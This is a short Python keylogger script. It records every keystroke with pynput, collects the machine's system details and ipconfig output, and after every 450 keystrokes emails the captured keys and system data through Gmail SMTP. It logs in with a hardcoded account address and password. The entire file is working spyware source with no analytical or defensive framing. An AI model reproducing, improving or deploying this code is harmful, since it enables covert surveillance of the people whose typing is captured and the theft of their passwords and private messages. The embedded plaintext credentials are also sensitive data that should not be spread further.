import smtplib
import requests
import platform
import subprocess
from pynput.keyboard import Listener
keys = []
mail_count = 0
url = "https://www.google.com"
timeout = 5

my_system = platform.uname()

info1 = f"System is {my_system.system}"
info2 = f"Node Name is {my_system.node}"
info3 = f"Release is {my_system.release}"
info4 = f"Version is {my_system.version}"
info5 = f"Machine is {my_system.machine}"
info6 = f"Processor is {my_system.processor}"
ipINFO = subprocess.check_output("ipconfig").decode('utf-8')

info_alpha = f"{info1}\n{info2}\n{info3}\n{info4}\n{info5}\n{info6}\n{ipINFO}"


infoX = str(info_alpha).replace(":", ";")



def on_press(key):
    global keys,mail_count
    keys.append(key)
    mail_count += 1

    if mail_count >= 450:
        mail_count = 0
        def mail():
            senders_email = 'alliswell7778869@gmail.com'
            senders_password = 'sasorifeelnopain'
            receiver_email = senders_email
            message = infoX + (str(keys_send))
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(senders_email, senders_password)
            server.sendmail(senders_email, receiver_email, message)

        try:
            request = requests.get(url, timeout=timeout)
            connect = 1
        except (requests.ConnectionError, requests.Timeout) as exception:
            connect = 0

        if connect == 1:
            keys_send = str(keys).replace(":", "")
            mail()
            keys = []



with Listener(on_press=on_press) as listener:
    listener.join()